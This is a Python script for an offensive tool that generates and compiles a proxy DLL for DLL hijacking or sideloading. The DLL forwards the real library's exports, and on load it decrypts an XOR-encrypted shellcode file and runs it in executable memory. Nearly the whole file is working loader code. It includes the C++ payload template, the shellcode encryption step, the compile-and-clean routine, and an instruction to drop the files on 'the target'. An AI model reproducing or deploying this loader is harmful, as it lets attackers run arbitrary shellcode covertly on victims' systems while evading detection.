#!/usr/bin/env python3
''' Create a proxy dll that will inject encrypted shellcode'''
import subprocess
import argparse
import sys
import pefile
from jinja2 import Template

with open("./templates/functions.template","r",encoding='utf-8') as f:
    function_template = f.read()

def generate_def_file(input_file,original_file,output_directory,dll_name):
    '''Create the def file for the functions to proxy'''
    dll = pefile.PE(input_file)
    #How do I handle things not in C:\windows\system32?
    dll_basename = (original_file).split('/')[-1].split('\\')[-1]

    forwarded_functions = []
    def_file = f'LIBRARY "{dll_basename}"\nEXPORTS\n'
    for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
        if export.name:
            decoded_name = export.name.decode()
            def_file += f'\t{decoded_name}={decoded_name}Fwd @{export.ordinal}\n'

            forwarded_functions.append(export.name.decode())
    with open(f'{output_directory}/{dll_name}.def','w',encoding='utf-8') as file:
        file.write(def_file)

    return forwarded_functions

def generate_cpp_file(functions_list,output_directory,xor_key, encoded_blob):
    '''Create the skeleton cpp file'''

    #Write headers
    headers = f'''
//Generated by chinese_diad (github.com/CleverNamesTaken/chinese_diad)
//I am not clever, and just copied/frankensteined the work of these projects:
//       github.com/Print3M/DllShimmer
//       github.com/Pascal-0x90/sideloadr
//       github.com/tothi/dll-hijack-by-proxying


#define WIN32_LEAN_AND_MEAN
#include "chinese_diad.h"
#include <windows.h>
#include <stdio.h>
#define XOR_KEY "{ xor_key }"
#define PATH "{ encoded_blob.split("/")[-1] }"



'''

    #Write function definitions
    functions = ""
    local_function_template = Template(function_template)
    for function in functions_list:
        functions += local_function_template.render({'function_name':function}) + '\n'


    main_body = '''
unsigned char* xor_encrypt(unsigned char* buf, size_t len)
{
    size_t key_len = sizeof(XOR_KEY) - 1;

    for (size_t i = 0; i < len; ++i) {
        buf[i] ^= XOR_KEY[i % key_len];
    }

    return buf;
}


unsigned char* read_file_bytes(const char* path, DWORD* outSize)
{
    HANDLE hFile = CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    DWORD size = GetFileSize(hFile, NULL);

    unsigned char* buffer = (unsigned char*)malloc(size);

    DWORD bytesRead;
    ReadFile(
        hFile,
        buffer,
        size,
        &bytesRead,
        NULL
    );

    CloseHandle(hFile);

    if (outSize)
        *outSize = size;

    return buffer;
}

DWORD WINAPI payload(LPVOID lpParameter) {
    HANDLE pHandle; // process handle
    HANDLE th;
    SIZE_T bytesWritten;
    DWORD id;

    DWORD size = 0;
	unsigned char* shellcode = read_file_bytes(PATH, &size);

    xor_encrypt(shellcode, size);

	LPVOID exec_mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (exec_mem == NULL) {
        return -1;
    }

    WriteProcessMemory(GetCurrentProcess(), exec_mem, shellcode, size, &bytesWritten);

    ((void(*)())exec_mem)();
    return 0;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { 
    HANDLE th;

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH: {
        th = CreateThread(NULL, 0, payload, NULL, 0, NULL);
        CloseHandle(th);
        #ifdef DEBUG
            dbgf("DLL_PROCESS_ATTACH");
        #endif
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
'''

    with open(f'{output_directory}/{module}.cpp','w',encoding='utf-8') as file:
        file.write(headers + functions + main_body)

def xor_encode(data: bytearray, key: bytes):
    """XOR encode (or decode) the data"""
    key_len = len(key)
    for i, value in enumerate(data):
        data[i] = value ^ key[i % key_len]



def encrypt_shellcode(key,shellcode,output_directory):
    '''Open up the shellcode, encrypt it and save it as a blog'''
    with open(shellcode, "rb") as file:
        data = bytearray(file.read())

    xor_encode(data, key.encode())
    blob_name = shellcode.split('/')[-1]
    with open(f'{output_directory}/{blob_name}','wb') as file:
        file.write(data)

def compile_dll(outdir,dll_name):
    '''Compile the dll'''

    if args.debug:
        command = (
            "x86_64-w64-mingw32-g++ -shared "
            f"{outdir}/{dll_name}.cpp "
            f"{outdir}/{dll_name}.def "
            f"-o {outdir}/{dll_name}.dll "
            "-static-libstdc++ -static-libgcc -D DEBUG=1"
        )
    else:
        command = (
            "x86_64-w64-mingw32-g++ -shared "
            f"{outdir}/{dll_name}.cpp "
            f"{outdir}/{dll_name}.def "
            f"-o {outdir}/{dll_name}.dll "
            "-static-libstdc++ -static-libgcc"
        )

    result = subprocess.run(command.split(), capture_output=True, text=True, check=False)
    if result.returncode != 0:
        print("Command failed:", result.stderr)
        sys.exit(-1)


    if not args.no_clean and not args.debug:
        with open('/dev/null', 'w', encoding='utf-8') as devnull:
            subprocess.run(
                ['rm',
                 f'{outdir}/{dll_name}.def',
                 f'{outdir}/{dll_name}.cpp',
                 f'{outdir}/chinese_diad.h'],
                stdout=devnull,
                stderr=devnull,
                check=True
            )

def generate_header_file(original_dll,outdir,dll_name):
    '''Generate the header file'''
    with open("./templates/chinese_diad.h.template","r",encoding='utf-8') as file:
        header_text = file.read()

    new_header = header_text.replace("{{.Original}}",original_dll.replace("\\","\\\\"))
    new_header = new_header.replace("{{.DllName}}",f"{dll_name}.dll")

    with open(f"{outdir}/chinese_diad.h", "w",encoding='utf-8') as file:
        file.write(new_header)

def parse():
    '''Parse all the arguments'''

    parser = argparse.ArgumentParser(
            description="Build a proxy DLL that executes XOR encrypted shellcode.",
            epilog = "python3 chinese_diad.py -i dnsapi.dll -o /tmp/chinese_diad -x 'C:\\Windows\\System32\\dnsapi.dll' -k 'PLUGX' -p /tmp/shellcode.bin")
    parser.add_argument( "-i", "--input", required=True,
                        help="Input DLL file")
    parser.add_argument( "-o", "--output", required=True,
                        help="Output directory")
    parser.add_argument( "-x", "--original", required=True,
                        help="Path to original DLL on target")
    #parser.add_argument( "-m", "--mutex", default=False, help="Multiple execution prevention")
    parser.add_argument( "-k", "--xor-key", default="HAXXOR",
                        help="XOR key used to encrypt the shellcode")
    parser.add_argument( "-p", "--shellcode-file", required=True,
                        help="Path to the unencrypted shellcode.  This will also be the name of the encrypted shellcode that will be loaded by the dll.")
    parser.add_argument( "-n", "--no-clean", action='store_true',
                        help="Delete the source files after compiling")
    parser.add_argument( "-d", "--debug", action='store_true',
                        help="Compile in debug mode.  This implies no clean up.")
    return parser.parse_args()

args = parse()

module = args.input.split("/")[-1].split('.')[0]

exported_functions = generate_def_file(args.input,args.original,args.output,module)
generate_cpp_file(exported_functions,args.output,args.xor_key,args.shellcode_file)
generate_header_file(args.original,args.output,module)
encrypt_shellcode(args.xor_key,args.shellcode_file,args.output)
compile_dll(args.output,module)

print(f"[+] Complete.  Move {args.output}/{module}.dll and {args.output}/{args.shellcode_file.split('/')[-1]} to the target and execute with your chosen dll hijack technique")
